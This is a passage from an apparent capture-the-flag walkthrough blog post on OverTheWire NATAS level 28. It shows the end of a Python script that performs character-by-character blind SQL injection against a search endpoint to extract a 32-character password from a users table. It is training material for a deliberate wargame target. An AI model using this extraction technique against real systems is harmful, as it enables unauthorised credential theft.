  <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/search.php?'</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">response</span>


<span class="c1"># Checking if we can connect to the target, just in case...
</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="n">requests</span><span class="p">.</span><span class="n">codes</span><span class="p">.</span><span class="n">ok</span><span class="p">:</span>
  <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Couldn</span><span class="se">\'</span><span class="s">t connect to target :('</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'Target reachable. Starting character parsing...'</span><span class="p">)</span>

<span class="c1"># Password is 32 characters long
</span><span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">allChars</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Trying Character: "</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Password so far: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">send_query</span><span class="p">(</span><span class="s">'select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #'</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span>
    <span class="k">if</span> <span class="s">'Halloween'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
      <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
      <span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">'Password: '</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"--- %s seconds ---"</span> <span class="o">%</span> <span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span><span class="p">))</span></code></pre></figure><p>It took a while on my VM though:</p><p><img class="alignnone size-full wp-image-333" data-src="/assets/img/2019/09/2019-09-26_14h14_56.png" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/overthewire/'>OverTheWire</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OverTheWire: NATAS 28 - MegaWattSec&amp;url=https://megawattsec.com/posts/overthewire-natas-28/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OverTheWire: NATAS 28 - MegaWattSec&amp;u=https://megawattsec.com/posts/overthewire-natas-28/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/overthewire-natas-28/&amp;text=OverTheWire: NATAS 28 - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/overthewire-natas-16/"><div class="card-body"> <em class="timeago small" data-ts="1568402533" > 2019-09-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 16 &#8211; 20</h3><div class="text-muted small"><p> LEVEL 16 This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source: &amp;lt;form&amp;gt; Find words containing: &amp;lt;input ...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-21/"><div class="card-body"> <em class="timeago small" data-ts="1568659795" > 2019-09-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 21 &#8211; 25</h3><div class="text-muted small"><p> LEVEL 21 This level has a second site associated with it, where all the action is: Main Site PHP sourcecode of the main page: &amp;lt;? function print_credentials() { if($_SESSION and array...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-26/"><div class="card-body"> <em class="timeago small" data-ts="1568918412" > 2019-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 26 &#8211; 27</h3><div class="text-muted small"><p> LEVEL 26 The sourcecode: &amp;lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private $exitMsg; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/overthewire-natas-26/" class="btn btn-outline-primary" prompt="Older"><p>OverTheWire: NATAS 26 &#8211; 27</p></a> <a href="/posts/overthewire-natas-29/" class="btn btn-outline-primary" prompt="Newer"><p>OverTheWire: NATAS 29</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
